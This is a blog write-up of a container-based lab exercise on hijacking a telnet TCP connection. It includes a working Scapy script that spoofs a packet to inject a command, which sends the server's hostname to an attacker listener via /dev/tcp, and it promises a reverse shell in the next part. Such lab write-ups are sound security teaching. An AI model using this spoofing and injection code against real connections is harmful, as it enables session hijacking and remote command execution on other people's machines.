+++
title = "TCP Attack Lab 2 - Hijack"
date = "2023-04-30"
description = "Hijacking a TCP connection."

tags = ["security","writeup",]
+++


We hijack a TCP connection.

In the first part of this series, we conducted a TCP Reset attack on a `telnet` connection between two users on the same LAN as a malicious actor.

In this second installment, we will hijack the `telnet` connection and execute an arbitrary command.


# Setup

The set up is the same as the [previous post](/blog/posts/tcp-attack-lab/0-overview).

 
# Hijacking a `telnet` Connection

Following these steps will hijack a TCP connection between User 1 as the client and User 2 as the server. We will have the server execute an arbitrary command on our behalf.

First, I open Wireshark and monitor the LAN interface. I select the bridge interface starting with "br-". The characters following may change if you stop and start the containers in a separate occurrence.

Then, I use `telnet` to connect from User 1 to User 2.

!["wireshark initial screen capture"](/blog/images/tcp-hijacking/wireshark-init.png)

Select the bridge interface.

---

Logging in to the `telnet` server (Remember: User 2) from the client generates network traffic that we will use to construct the hijack packet. 

!["telnet connection"](/blog/images/tcp-hijacking/telnet-init.png)

The telnet connection.

---

The last TCP packet sent from User 1 to User 2 will inform the source port, sequence, and acknowledgement numbers used in the hijack packet we will spoof from the attacker to the server.

!["wireshark screen capture"](/blog/images/tcp-hijacking/wireshark-data.png)

Using Wireshark to construct our hijack packet.

---


## Brief: `netcat`

In order to see the output of the command, we will set up a TCP server using `netcat`. 

!["netcat init"](/blog/images/tcp-hijacking/netcat-init.png)

Setting up a TCP server using netcat to see the output of our hijack attack.

---


# Running the exploit

The following code will send our hijack packet:

```python
import argparse
from scapy.all import *

def spoof_hijack_packet(src_port, seq_num, ack_num):
	user1_ip = "10.9.0.6"
	user2_ip = "10.9.0.7"

	user1_port = src_port
	user2_port = 23

	ip = IP(src=user1_ip, dst=user2_ip)
	tcp = TCP(sport=user1_port, dport=user2_port, flags="A", seq=seq_num, ack=ack_num)
	data = "\r hostname > /dev/tcp/10.9.0.1/9090 \r"

	pkt = ip/tcp/data

	print("SENDING HIJACK PACKET........")
	send(pkt)

if __name__ == "__main__":
	parser = argparse.ArgumentParser()
	parser.add_argument("-p", "--src_port", type=int, help="source port", required=True)
	parser.add_argument("-s", "--seq", type=int, help="last sequence number", required=True)
	parser.add_argument("-a", "--ack", type=int, help="last acknowledgement number", required=True)

	args = parser.parse_args()

	spoof_hijack_packet(args.src_port, args.seq, args.ack)
```

For convenience, I designed the program to take the source port number, sequence number, and acknowledgement number as arguments. I invoke it as follows with the data gathered from Wireshark.

!["attack"](/blog/images/tcp-hijacking/python-attack.png)

Running the attack program with arguments for source port, sequence, and acknowledgement numbers.

---

The `netcat` TCP server we established on port 9090 displays the output from the `hostname` command run on the server. 

!["netcat after"](/blog/images/tcp-hijacking/netcat-after.png)

The TCP server displays the hostname of the server.

---

Which we can verify matches User 2's hostname. 

!["result"](/blog/images/tcp-hijacking/hostname.png)

Hostname of the telnet server, User 2

---

If you were to go back to the `telnet` connection, we see that the connection no longer takes input. This is because the machines have detected the funny business from our spoofed packet.


# That's it!

We explored the TCP protocol in greater depth, hijacking a TCP connection between two users on the same LAN as the attacker and executing an arbitrary command.

In the final installment of this series, we will go a step further and execute a reverse shell using the TCP hijacking technique presented here.


### _Updated: April 30, 2023_
